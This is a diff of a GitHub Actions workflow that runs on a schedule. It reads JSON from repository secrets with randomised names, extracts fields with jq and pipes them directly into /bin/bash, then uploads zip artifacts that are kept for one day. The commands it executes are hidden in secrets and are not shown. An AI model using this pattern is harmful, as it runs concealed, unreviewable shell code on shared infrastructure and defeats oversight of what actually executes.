@@ -1,30 +1,24 @@
 name: zuanshifanjin
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '12 2/6 * * *'
-jobs:  # 13654
+    - cron: '11 2,8,14,20 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zuanshifanjin
         env:
-          y7361: ${{ secrets.y7361 }}
+          gmbcr189: ${{ secrets.gmbcr189 }}
         run: |
-          echo $y7361 | jq -r .mdb1058 | /bin/bash
-          echo $ahudc24 | jq -r .hyq28582 | /bin/bash
-          echo $w82 | jq -r .notw97233 | /bin/bash
-          echo $vac14434 | jq -r .j8 | /bin/bash
-          echo $ckzy779 | jq -r .s4681 | /bin/bash
-          echo $scx04 | jq -r .f20 | /bin/bash
-          echo $ck17816 | jq -r .hy1 | /bin/bash
-          echo $ffq106 | jq -r .b86 | /bin/bash
-          echo $i80787 | jq -r .qz10 | /bin/bash
-          echo $ojck3755 | jq -r .q4 | /bin/bash
-          echo $njkm6 | jq -r .hd082 | /bin/bash
-          echo $uczm83409 | jq -r .xnoav71 | /bin/bash
-          echo $sediu3 | jq -r .fi1955 | /bin/bash
-          echo $xvxb0 | jq -r .hiutr7737 | /bin/bash
+          printf '%s' "$gmbcr189" | jq -r .bs7 | /bin/bash
+          printf '%s' "$trmmd52" | jq -r .rowyo8 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: bY9KYRdz
+          path: "*.zip"
+          retention-days: 1
